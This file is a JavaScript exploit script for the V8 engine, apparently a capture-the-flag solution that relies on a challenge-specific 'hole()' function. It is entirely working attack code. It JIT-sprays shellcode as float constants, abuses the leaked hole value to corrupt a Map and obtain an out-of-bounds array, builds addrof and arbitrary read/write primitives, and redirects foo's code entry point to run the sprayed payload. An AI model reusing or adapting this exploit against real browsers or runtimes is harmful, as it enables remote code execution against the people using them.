function foo() {
    return [
        1.95538254221075331056310651818E-246,
        1.95606125582421466942709801013E-246,
        1.99957147195425773436923756715E-246,
        1.95337673326740932133292175341E-246,
        2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {foo();foo();foo();foo();}


var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function  ftoi(val) {
   f64_buf[0] = val;
   return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
   u64_buf[0] = Number(val & 0xffffffffn);
   u64_buf[1] = Number(val >> 32n);
   return f64_buf[0];
}

var v = [];
map = new Map();
map.set(1,1);
map.set(v.hole(),1);
map.delete(v.hole());
map.delete(v.hole());
map.delete(1);
oob_arr = new Array(6.8,6.9);
map.set(0x10, -1);
map.set(oob_arr, 0xffff);
victim = [{}, {}, {}, {}];
arb_gadget = [7.7,8.8,9.9];

function addrof(in_obj) {
   mask = (1n << 32n) - 1n
   victim[0] = in_obj;
   return ftoi(oob_arr[12]) & mask;
}

function arb_read(addr) {
   oob_arr[37] = itof(0x600000000n+addr-0x8n);
   return ftoi(arb_gadget[0]);
}

function arb_write(addr,value) {
   oob_arr[37] = itof(0x600000000n+addr-0x8n);
   arb_gadget[0] = itof(value);
}

foo_code = arb_read(addrof(foo)+0x18n) & ((1n << 32n) - 1n);
foo_code_entry_point = arb_read(foo_code+0xcn);
arb_write(foo_code+0xcn, foo_code_entry_point+96n);
foo();
